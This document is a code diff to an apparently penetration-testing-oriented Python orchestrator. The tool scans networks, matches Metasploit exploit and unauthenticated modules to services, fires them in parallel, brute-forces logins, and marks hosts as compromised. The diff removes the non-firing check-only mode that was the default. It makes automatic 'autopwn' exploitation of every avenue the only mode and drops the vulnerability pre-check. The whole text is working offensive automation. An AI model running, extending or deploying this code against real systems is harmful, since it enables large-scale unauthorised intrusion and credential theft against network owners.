@@ -189,9 +189,8 @@ def _bootstrap_runtime():
 # Gate the runtime before any project module or third-party package is imported.
 _bootstrap_runtime()
 
-from state import (RunState, HostState, Candidate, Verdict, TERMINAL_STATES,
-                   is_exploitable_verdict, is_fireable_verdict)
-from scanner import Scanner, ScanConfig, NmapError, nse_scripts_for_cve
+from state import RunState, HostState, TERMINAL_STATES
+from scanner import Scanner, ScanConfig, NmapError
 from msf import (MsfClient, MsfConfig, RANK_VALUES, BRUTE_USER_SEED,
                  BRUTE_PASS_SEED, login_module_for, locate_wordlist,
                  write_builtin_wordlists)
@@ -201,9 +200,8 @@ from system import (preflight, PreflightError, FirewallManager, MsfdManager,
 logger = logging.getLogger(__name__)
 
 # Fire ordering in autopwn: confirmed-vulnerable first, then likely, then
-# unsupported (no-check backdoors), then unknown. Only SAFE is never fired.
-_FIRE_PRIORITY = {Verdict.VULNERABLE: 4, Verdict.LIKELY: 3,
-                  Verdict.UNSUPPORTED: 2, Verdict.UNKNOWN: 1}
+# Exploit candidates arrive rank-sorted from msf; fire ordering is by rank alone
+# now that there is no check verdict to weight.
 _RANK_ORDER = RANK_VALUES
 
 
@@ -393,8 +391,7 @@ class Orchestrator:
         # parallel; these track outstanding services per host so the host finalizes
         # to exploited/failed only when its last service completes.
         self._fire_lock = threading.Lock()
-        self._fire_pending = {}          # ip -> outstanding service-fire count
-        self._fire_got = {}              # ip -> any session opened on the host
+        self._fire_pending = {}          # ip -> outstanding attack-task count
 
     # -- lifecycle --
 
@@ -405,9 +402,8 @@ class Orchestrator:
             self._discover_phase()
             # Resolve wordlists once, before firing, so credentialed exploits can
             # draw a default USERNAME/PASSWORD from the seclists top entries, and so
-            # the brute phase reuses the same resolution. autopwn only.
-            if self.run.mode == "autopwn":
-                self._prime_credentials()
+            # the brute phase reuses the same resolution.
+            self._prime_credentials()
             self.run.set_phase("scan")
             self._scan_pool = ThreadPoolExecutor(
                 max_workers=self.cfg.workers, thread_name_prefix="scan")
@@ -418,11 +414,12 @@ class Orchestrator:
                     break
                 self._scan_pool.submit(self._process_host, ip)
             self._main_loop(display)
-            # The brute phase runs once the whole fire pipeline has drained, on a
-            # clean completion only (a signal skips it). autopwn-only: check mode
-            # has no fire step to follow.
-            if not self._stop.is_set() and self.run.mode == "autopwn":
+            # The brute phase runs once the attack pipeline has drained, on a clean
+            # completion only (a signal skips it). Credentials it finds upgrade any
+            # host the per-host attack left clean.
+            if not self._stop.is_set():
                 self._brute_phase(display)
+                self._reconcile_after_brute()
             # Normal completion means we ended on _is_done, not a signal.
             self._completed = not self._stop.is_set()
         finally:
@@ -502,50 +499,50 @@ class Orchestrator:
                     state = self.run.get_state(ip)
                     if state in TERMINAL_STATES:
                         return
-                if state == HostState.CANDIDATES:
-                    # autopwn fires every ranked candidate with no pre-check; only
-                    # check mode runs the per-candidate check phase. The fire loop
-                    # tries candidates in rank order until one lands.
-                    if self.run.mode == "autopwn":
-                        self.run.transition(ip, HostState.EXPLOITABLE)
-                    else:
-                        self._do_check(ip)
-                    state = self.run.get_state(ip)
-                    if state in TERMINAL_STATES:
-                        return
-                if state == HostState.EXPLOITABLE and self.run.mode == "autopwn":
-                    self._submit_fire(ip)
+                if state == HostState.ATTACKING:
+                    self._submit_attack(ip)
             except Exception as e:
                 self.run.set_error(ip, f"pipeline error: {e}")
                 logger.exception("pipeline failed for %s", ip)
 
-    def _submit_fire(self, ip):
+    def _submit_attack(self, ip):
+        """Attack the host on every avenue at once: exploit candidates fire (grouped
+        by service, first session wins the group), and auxiliary/unauth candidates
+        run to prove unauthenticated access. The host finalizes when the last task
+        completes, COMPROMISED if it has any session, credential, or access, else
+        CLEAN."""
         if self._stop.is_set():
             return
-        self.run.transition(ip, HostState.EXPLOITING)
         host = self.run.host_copy(ip)
         groups = self._service_groups(host)
-        if not groups:
-            self.run.transition(ip, HostState.FAILED)
+        aux_cands = _aux_candidates(host)
+        total = len(groups) + len(aux_cands)
+        if total == 0:
+            self.run.transition(ip, HostState.CLEAN)
             return
         with self._fire_lock:
-            self._fire_pending[ip] = len(groups)
-            self._fire_got[ip] = False
+            self._fire_pending[ip] = total
         for key, cands in groups.items():
             try:
                 self._fire_pool.submit(self._fire_service_wrapper, ip, key, cands)
             except RuntimeError:
                 # Pool shutting down during teardown. Account for the un-submitted
-                # service so the host still finalizes rather than hanging pending.
-                self._service_done(ip, False)
+                # task so the host still finalizes rather than hanging pending.
+                self._attack_done(ip)
+        for cand in aux_cands:
+            try:
+                self._fire_pool.submit(self._aux_wrapper, ip, cand)
+            except RuntimeError:
+                self._attack_done(ip)
 
     def _service_groups(self, host):
-        """Group a host's fireable candidates by service, preserving rank order
-        within each group. The same daemon on two ports (Samba 139/445, UnrealIRCd
-        6667/6697) shares one product key so it is one group -- a session on either
-        port satisfies it. Each group fires as one parallel task; the group stops at
-        its first session, so a risky overflow like trans2open is never fired at a
-        daemon usermap_script already popped on this port or its sibling."""
+        """Group a host's fireable exploit candidates by service, preserving rank
+        order within each group. The same daemon on two ports (Samba 139/445,
+        UnrealIRCd 6667/6697) shares one product key so it is one group -- a session
+        on either port satisfies it. Each group fires as one parallel task; the
+        group stops at its first session, so a risky overflow like trans2open is
+        never fired at a daemon usermap_script already popped on this port or its
+        sibling."""
         port_service = {}
         for svc in host.services:
             port_service[svc.port] = svc.product or f"port-{svc.port}"
@@ -557,20 +554,19 @@ class Orchestrator:
 
     def _fire_service_wrapper(self, ip, key, cands):
         if self._stop.is_set():
-            self._service_done(ip, False)
+            self._attack_done(ip)
             return
-        got = False
         with self.run.worker_slot():
             try:
-                got = self._do_fire_service(ip, cands)
+                self._do_fire_service(ip, cands)
             except Exception:
                 logger.exception("fire failed for %s service %s", ip, key)
-        self._service_done(ip, got)
+        self._attack_done(ip)
 
     def _do_fire_service(self, ip, cands):
         """Fire one service's candidates in rank order, stopping at the first
-        session. Returns True if a session opened. Runs concurrently with the
-        host's other services on the fire pool."""
+        session. Runs concurrently with the host's other services on the fire
+        pool."""
         host = self.run.host_copy(ip)
         for cand in cands:
             if self._stop.is_set():
@@ -579,24 +575,47 @@ class Orchestrator:
             self.run.update_candidate_fire(ip, cand.module, status, detail)
             if session is not None:
                 self.run.add_session(ip, session)
-                return True
-        return False
+                return
 
-    def _service_done(self, ip, got):
-        """Record a finished service fire and finalize the host when its last
-        service completes: exploited if any service opened a session, else failed."""
+    def _aux_wrapper(self, ip, cand):
+        if self._stop.is_set():
+            self._attack_done(ip)
+            return
+        with self.run.worker_slot():
+            try:
+                self._do_run_aux(ip, cand)
+            except Exception:
+                logger.exception("aux failed for %s %s", ip, cand.module)
+        self._attack_done(ip)
+
+    def _do_run_aux(self, ip, cand):
+        """Run one auxiliary/unauth module and record any confirmed access. The
+        module's service name is looked up from the host by port for the record."""
+        host = self.run.host_copy(ip)
+        svc_name = ""
+        for svc in host.services:
+            if svc.port == cand.port:
+                svc_name = svc.name
+                break
+        access, _detail = self.msf.run_auxiliary(cand, ip, cand.port, svc_name)
+        for acc in access:
+            self.run.add_access(ip, acc)
+
+    def _attack_done(self, ip):
+        """Record a finished attack task and finalize the host when its last task
+        completes: COMPROMISED if it proved impact (session, credential, or
+        access), else CLEAN."""
         with self._fire_lock:
             if ip not in self._fire_pending:
                 return
-            if got:
-                self._fire_got[ip] = True
             self._fire_pending[ip] -= 1
             if self._fire_pending[ip] > 0:
                 return
             self._fire_pending.pop(ip, None)
-            final_got = self._fire_got.pop(ip, False)
+        host = self.run.host_copy(ip)
+        proven = bool(host and host.is_compromised)
         self.run.transition(
-            ip, HostState.EXPLOITED if final_got else HostState.FAILED)
+            ip, HostState.COMPROMISED if proven else HostState.CLEAN)
 
     def _do_scan(self, ip):
         self.run.transition(ip, HostState.SCANNING)
@@ -615,62 +634,20 @@ class Orchestrator:
         self.run.transition(ip, HostState.ANALYZED)
 
     def _do_analyze(self, ip):
+        """Build every avenue of attack for the host: exploit and auxiliary modules
+        matched by CVE and product, plus the curated unauthenticated tier. A host
+        with no avenue goes straight to CLEAN; otherwise it enters ATTACKING."""
         host = self.run.host_copy(ip)
         candidates = []
         for svc in host.services:
             candidates.extend(
                 self.msf.candidates_for_service(svc, host.os_match))
+            candidates.extend(self.msf.unauth_candidates_for_service(svc))
         if not candidates:
-            self.run.transition(ip, HostState.NO_CANDIDATES)
+            self.run.transition(ip, HostState.CLEAN)
             return
         self.run.set_candidates(ip, candidates)
-        self.run.transition(ip, HostState.CANDIDATES)
-
-    def _do_check(self, ip):
-        self.run.transition(ip, HostState.CHECKING)
-        host = self.run.host_copy(ip)
-        msf_cands = [c for c in host.candidates if c.source == "msf"]
-        # reset to msf-only so a resumed partial check does not duplicate nse rows
-        self.run.set_candidates(ip, msf_cands)
-        any_exploitable = False
-        any_fireable = False
-        nse_done = set()
-        for cand in msf_cands:
-            if self._stop.is_set():
-                break
-            verdict, detail = self.msf.check(cand, ip, cand.port)
-            self.run.update_candidate_result(ip, cand.module, verdict, detail)
-            if is_exploitable_verdict(verdict):
-                any_exploitable = True
-            if is_fireable_verdict(verdict):
-                any_fireable = True
-            scripts = nse_scripts_for_cve(cand.cve_id)
-            if scripts:
-                key = (cand.port, tuple(scripts))
-                if key in nse_done:
-                    continue
-                nse_done.add(key)
-                nv, nd = self.scanner.nse_verify(ip, cand.port, scripts)
-                self.run.add_candidate(ip, Candidate(
-                    module=",".join(scripts), cve_id=cand.cve_id, rank="nse",
-                    port=cand.port, source="nse", check_result=nv,
-                    check_detail=nd))
-                if is_exploitable_verdict(nv):
-                    any_exploitable = True
-        # In autopwn, anything the check did not rule out (non-SAFE) is worth
-        # firing -- backdoor modules report UNSUPPORTED yet are the real way in.
-        # In check mode, EXPLOITABLE stays strict (confirmed/likely only).
-        if self.run.mode == "autopwn":
-            enter_fire = any_fireable
-        else:
-            enter_fire = any_exploitable
-        logger.info("check done %s: %d candidate(s) exploitable=%s fireable=%s "
-                    "-> %s", ip, len(msf_cands), any_exploitable, any_fireable,
-                    "fire" if (enter_fire and self.run.mode == "autopwn")
-                    else ("EXPLOITABLE" if enter_fire else "not exploitable"))
-        self.run.transition(
-            ip, HostState.EXPLOITABLE if enter_fire
-            else HostState.NOT_EXPLOITABLE)
+        self.run.transition(ip, HostState.ATTACKING)
 
     def _ports_from_state(self, ip):
         host = self.run.host_copy(ip)
@@ -679,11 +656,7 @@ class Orchestrator:
     # -- main loop and completion --
 
     def _is_done(self):
-        pending = self.run.pending_hosts()
-        if self.run.mode == "check":
-            pending = [ip for ip in pending
-                       if self.run.get_state(ip) != HostState.EXPLOITABLE]
-        return len(pending) == 0
+        return len(self.run.pending_hosts()) == 0
 
     def _main_loop(self, display):
         last_ckpt = time.time()
@@ -700,8 +673,8 @@ class Orchestrator:
                 last_ckpt = now
             if display is None and now - last_status >= self.cfg.headless_status_interval:
                 s = self.run.stats()
-                logger.info("progress: %d/%d done, %d exploitable, %d sessions, "
-                            "%d workers", s.completed, s.total, s.exploitable,
+                logger.info("progress: %d/%d done, %d compromised, %d sessions, "
+                            "%d workers", s.completed, s.total, s.compromised,
                             s.sessions, s.active_workers)
                 last_status = now
             if self._is_done():
@@ -735,6 +708,16 @@ class Orchestrator:
         finally:
             self._brute_pool.shutdown(wait=True)
             self.run.save_checkpoint()
+
+    def _reconcile_after_brute(self):
+        """Upgrade any CLEAN host the brute phase gave a credential to COMPROMISED,
+        so a host proven only by a late-found login is not left labelled clean."""
+        for host in self.run.snapshot_hosts():
+            if host.state == HostState.CLEAN and host.is_compromised:
+                try:
+                    self.run.transition(host.ip, HostState.COMPROMISED)
+                except Exception:
+                    pass
 
     def _brute_targets(self):
         """One (ip, service, login_module, port) per distinct login scanner on each
@@ -921,15 +904,27 @@ class Orchestrator:
 # --- fire candidate selection ----------------------------------------------
 
 def _fireable(host):
+    """Exploit candidates for the fire path, rank-highest first. source 'msf'
+    marks an exploit module; auxiliary and unauth candidates run a different
+    path."""
+    out = [c for c in host.candidates if c.source == "msf"]
+    out.sort(key=lambda c: _RANK_ORDER.get(c.rank, 0), reverse=True)
+    return out
+
+
+def _aux_candidates(host):
+    """Auxiliary and unauthenticated candidates for the run path, deduped by
+    module so a module reached by both CVE/product search and the curated map runs
+    once."""
+    seen = set()
     out = []
     for c in host.candidates:
-        if c.source != "msf":
+        if c.source not in ("auxiliary", "unauth"):
             continue
-        if c.check_result == Verdict.SAFE:
+        if c.module in seen:
             continue
+        seen.add(c.module)
         out.append(c)
-    out.sort(key=lambda c: (_FIRE_PRIORITY.get(c.check_result, 0),
-                            _RANK_ORDER.get(c.rank, 0)), reverse=True)
     return out
 
 
@@ -1101,8 +1096,8 @@ def _parse_args(argv):
     p.add_argument("--exclude-file", help="file of exclusions, one per line")
     p.add_argument("--include-self", action="store_true",
                    help="do not auto-exclude the tester's own in-scope addresses")
-    p.add_argument("--mode", choices=("check", "autopwn"), default="check",
-                   help="check only (default) or autopwn (fire)")
+    p.add_argument("--mode", choices=("autopwn",), default="autopwn",
+                   help="autopwn: fire every avenue and report proven impact")
     p.add_argument("--workers", type=int, default=10)
     p.add_argument("--fire-workers", type=int, default=16)
     p.add_argument("--chunk-size", type=int, default=2048)
@@ -1299,8 +1294,8 @@ def main(argv=None):
     orch.run_pipeline(display)
 
     s = run.stats()
-    logger.info("done: %d live, %d exploitable, %d exploited, %d session(s)",
-                s.live, s.exploitable, s.exploited, s.sessions)
+    logger.info("done: %d live, %d compromised, %d access, %d session(s)",
+                s.live, s.compromised, s.access, s.sessions)
     return 0
 
 
